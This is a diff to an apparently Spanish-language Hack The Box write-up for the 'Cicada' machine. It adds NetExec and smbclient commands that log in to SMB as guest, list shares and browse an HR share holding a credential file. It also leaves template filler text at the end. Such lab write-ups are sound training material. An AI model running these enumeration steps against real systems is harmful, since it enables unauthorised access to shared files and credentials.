@@ -94,9 +94,9 @@ El foothold en esta máquina es fácil. Vamos a probar un par de cosas:
 Vamos a intentar conectarnos con la herramienta NetExec mediante SMB con el usuario "guest" a ver si podemos:
 
 ```js
-netexec smb 10.10.11.35 -u 'guest' -p '
+❯ netexec smb 10.10.11.35 -u 'guest' -p '
 ```
-
+Y nos deja conectarnos:
 ```ruby
 	[*] First time use detected
 	[*] Creating home directory structure
@@ -119,9 +119,24 @@ netexec smb 10.10.11.35 -u 'guest' -p '
 	[*] Copying default configuration file
 	SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
 	SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest:
-end
 ```
+Ahora voy a proceder a listar las carpetas que se comparte y encontramos algunas que pueden contener información sensible:
 
+```js
+❯ netexec smb 10.10.11.35 -u 'guest' -p '' --shares
+```
+Y encontramos dos carpetas que son de nuestros interes, HR y DEV, voy a intentar acceder a HR a ver si puedo encontrar algo:
+```js
+smbclient //10.10.11.35/HR
+```
+```js
+smb: \> ls
+	  .                                   D        0  Thu Mar 14 13:29:09 2024
+	  ..                                  D        0  Thu Mar 14 13:21:29 2024
+	  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024
+```
+Y encontramos un .txt en el que dentro de el se encuentra una credencial.
+![Texto alternativo](/assets/cicada.png)
 #### [](#header-4)Header 4
 
 *   This is an unordered list following a header.
